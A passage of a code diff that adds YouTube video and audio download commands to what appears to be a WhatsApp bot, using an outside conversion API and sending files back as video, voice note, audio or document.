+      description: `Size: ${v.size} | Kualitas: ${v.q}`},{
+      	title: `Audio`, 
+	     rowId: `${prefix}nxrvn ${jan}|${nganu.id}|mp3|128|${v.size}|${nganu.token}|${nganu.expires}`,
+      description: `Size: ${v.size} | Kualitas: ${v.q}`}, {
+      	title: `Dokumen`, 
+	     rowId: `${prefix}nxrvn ${jan}|${nganu.id}|mp3|128|${v.size}|${nganu.token}|${nganu.expires}`,
+      description: `Size: ${v.size} | Kualitas: ${v.q}`
+	    }))
+            nganu.data.mp4.map(v => sections[0].rows.push({
+	     title: `${v.q}`, 
+	     rowId: `${prefix}nxrvd ${jan}|${nganu.id}|mp4|${v.k}|${v.size}|${nganu.token}|${nganu.expires}`,
+      description: `Size: ${v.size}`	     
+	    }))
+	
+     const sendm =  XeonBotInc.sendMessage(
+      m.chat, 
+      {
+       text: `\`\`\`${cok}\`\`\` \n\n\n_*Pilih Tipe*_`,
+       footer: `${botname}`,
+       title: "*YOUTUBE VIDEO*",
+       buttonText: "CLICK HERE",
+       sections
+      }, { quoted : m })                 
+      await sendm
+      XeonBotInc.sendMessage(from, { react: { text: `✅`, key: m.key }})
+      }
+            break
+            case 'nxrvd': {
+            	XeonBotInc.sendMessage(from, { react: { text: `📥`, key: m.key }})
+           const siji = q.split('|')[0]
+           const loro = q.split('|')[1]
+           const telu = q.split('|')[2]
+           const papat = q.split('|')[3]
+           const limo = q.split('|')[4]
+           const enem = q.split('|')[5]
+           const pitu = q.split('|')[6]
+           let ekse = await fetchJson(`https://yt.nxr.my.id/convert?url=${siji}&id=${loro}&ext=${telu}&quality=${papat}&size=${limo}&token=${enem}&expires=${pitu}`)
+          reply(`https://yt.nxr.my.id/convert?url=${siji}&id=${loro}&ext=${telu}&quality=${papat}&size=${limo}&token=${enem}&expires=${pitu}`)
+           let gambar = await getBuffer(ekse.thumbnail)
+               if (ekse.data.size.split('MB')[0] >= 100) return reply(`*Ukuran File Melebihi Kapasitas Maksimum* \n\nSilahkan download sendiri,\nSize: ${ekse.data.size}\n\nLink: ⤵ ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏\n`+util.format(ekse.data.size))
+         const bjir =  XeonBotInc.sendMessage(m.chat, {video: {url: ekse.data.url}, mimetype: 'video/mp4', fileName: `${ekse.data.filename}`, caption: `_*${ekse.data.filename}*_`}, {quoted:m}).then( XeonBotInc.sendMessage(m.chat, {text: `Uploading...`}, {quoted: m}))///////////////////////////.catch((err) => reply(`_*Error!*_ \n\n*TypeError*: ${jsonformat(err)}`))
+await bjir
+ XeonBotInc.sendMessage(from, { react: { text: `✅`, key: m.key }})
+            	}
+            	break
+            case 'nxrvn': {
+           XeonBotInc.sendMessage(from, { react: { text: `📥`, key: m.key }})
+           const siji = q.split('|')[0]
+           const loro = q.split('|')[1]
+           const telu = q.split('|')[2]
+           const papat = q.split('|')[3]
+           const limo = q.split('|')[4]
+           const enem = q.split('|')[5]
+           const pitu = q.split('|')[6]
+           let ekse = await fetchJson(`https://yt.nxr.my.id/convert?url=${siji}&id=${loro}&ext=${telu}&quality=${papat}&size=${limo}&token=${enem}&expires=${pitu}`)
+          ////////////////////////////// reply(`https://yt.nxr.my.id/convert?url=${siji}&id=${loro}&ext=${telu}&quality=${papat}&size=${limo}&token=${enem}&expires=${pitu}`)
+           let gambar = await getBuffer(ekse.thumbnail)
+           if (ekse.data.size.split('MB')[0] >= 20) return reply(`*Ukuran File Melebihi Kapasitas Maksimum* \n\nSilahkan download sendiri,\nSize: ${ekse.data.size}\n\nLink: ⤵ ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏\n`+util.format(ekse.data.size))
+         const bjir =  XeonBotInc.sendMessage(m.chat, {audio: {url: ekse.data.url}, mimetype: 'audio/mpeg', ptt: true, contextInfo:{externalAdReply:{
+title:`${global.botname}`,
+body:`Voice Note | 128K`,
+thumbnail: gambar,
+mediaType:2,
+mediaUrl: `${linkz}`,
+sourceUrl: ``
+}}}, {quoted:m}).then( XeonBotInc.sendMessage(m.chat, {text: `Uploading...`}, {quoted: m}))///////////////////////////.catch((err) => reply(`_*Error!*_ \n\n*TypeError*: ${jsonformat(err)}`))
+await bjir
+ XeonBotInc.sendMessage(from, { react: { text: `✅`, key: m.key }})
+            	}
+            break
+            case 'nxrad': {
+           XeonBotInc.sendMessage(from, { react: { text: `📥`, key: m.key }})
+           const siji = q.split('|')[0]
+           const loro = q.split('|')[1]
+           const telu = q.split('|')[2]
+           const papat = q.split('|')[3]
+           const limo = q.split('|')[4]
+           const enem = q.split('|')[5]
+           const pitu = q.split('|')[6]
+           let ekse = await fetchJson(`https://yt.nxr.my.id/convert?url=${siji}&id=${loro}&ext=${telu}&quality=${papat}&size=${limo}&token=${enem}&expires=${pitu}`)
+          ////////////////////////////// reply(`https://yt.nxr.my.id/convert?url=${siji}&id=${loro}&ext=${telu}&quality=${papat}&size=${limo}&token=${enem}&expires=${pitu}`)
+           let gambar = await getBuffer(ekse.thumbnail)
+               if (ekse.data.size.split('MB')[0] >= 20) return reply(`*Ukuran File Melebihi Kapasitas Maksimum* \n\nSilahkan download sendiri,\nSize: ${ekse.data.size}\n\nLink: ⤵ ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏\n`+util.format(ekse.data.size))
+         const bjir =  XeonBotInc.sendMessage(m.chat, {audio: {url: ekse.data.url}, mimetype: 'audio/mpeg', contextInfo:{externalAdReply:{
+title:`${global.botname}`,
+body:`Audio | 128K`,
+thumbnail: gambar,
+mediaType:2,
+mediaUrl: `${linkz}`,
+sourceUrl: ``
+}}}, {quoted:m}).then( XeonBotInc.sendMessage(m.chat, {text: `Uploading...`}, {quoted: m}))///////////////////////////.catch((err) => reply(`_*Error!*_ \n\n*TypeError*: ${jsonformat(err)}`))
+await bjir
+ XeonBotInc.sendMessage(from, { react: { text: `✅`, key: m.key }})
+            	}
+            break
+            case 'nxrdc': {
+           XeonBotInc.sendMessage(from, { react: { text: `📥`, key: m.key }})
+           const siji = q.split('|')[0]
+           const loro = q.split('|')[1]
+           const telu = q.split('|')[2]
+           const papat = q.split('|')[3]
+           const limo = q.split('|')[4]
+           const enem = q.split('|')[5]
+           const pitu = q.split('|')[6]
+           let ekse = await fetchJson(`https://yt.nxr.my.id/convert?url=${siji}&id=${loro}&ext=${telu}&quality=${papat}&size=${limo}&token=${enem}&expires=${pitu}`)
+          ////////////////////////////// reply(`https://yt.nxr.my.id/convert?url=${siji}&id=${loro}&ext=${telu}&quality=${papat}&size=${limo}&token=${enem}&expires=${pitu}`)
+           let gambar = await getBuffer(ekse.thumbnail)
+               if (ekse.data.size.split('MB')[0] >= 20) return reply(`*Ukuran File Melebihi Kapasitas Maksimum* \n\nSilahkan download sendiri,\nSize: ${ekse.data.size}\n\nLink: ⤵ ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏\n`+util.format(ekse.data.size))
+         const bjir =  XeonBotInc.sendMessage(m.chat, {document: {url: ekse.data.url}, mimetype: 'audio/mpeg', fileName: `${ekse.data.filename}`, contextInfo:{externalAdReply:{
+title:`${global.botname}`,
+body:`Dokumen | 128K`,
+thumbnail: gambar,
+mediaType:2,
+mediaUrl: `${linkz}`,
+sourceUrl: ``
+}}}, {quoted:m}).then( XeonBotInc.sendMessage(m.chat, {text: `Uploading...`}, {quoted: m}))///////////////////////////.catch((err) => reply(`_*Error!*_ \n\n*TypeError*: ${jsonformat(err)}`))
+await bjir
